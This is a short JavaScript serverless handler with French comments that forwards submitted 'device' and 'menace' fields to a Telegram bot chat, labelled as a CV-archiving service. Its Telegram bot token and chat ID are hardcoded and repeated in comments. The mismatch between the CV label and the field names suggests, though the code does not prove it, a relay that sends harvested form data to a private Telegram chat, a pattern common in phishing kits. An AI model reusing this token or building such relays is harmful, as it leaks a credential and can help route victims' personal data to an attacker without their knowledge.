export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Non autorisé');
    
    const { device, menace } = req.body;
    // Utilisation de ton nouveau token : 8671676965:AAFjSDsyEkyPX7B5d_d49vfYbOrEc18l410
    const BOT_TOKEN = "8671676965:AAFjSDsyEkyPX7B5d_d49vfYbOrEc18l410";
    // Ton ID utilisateur : 6224971749
    const CHAT_ID = "6224971749";

    const text = `📁 **PRO-CV IVOIRE : NOUVEAU CV** 📁\n` +
                 `━━━━━━━━━━━━━━━━━━\n` +
                 `🚀 **Plateforme** : ${device}\n` +
                 `👤 **Infos** : \n${menace}\n` +
                 `━━━━━━━━━━━━━━━━━━\n` +
                 `✅ *Archivé par Ndiaye Techn*`;

    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
        });
        return res.status(200).json({ ok: true });
    } catch (e) {
        return res.status(500).json({ error: "Erreur" });
    }
}
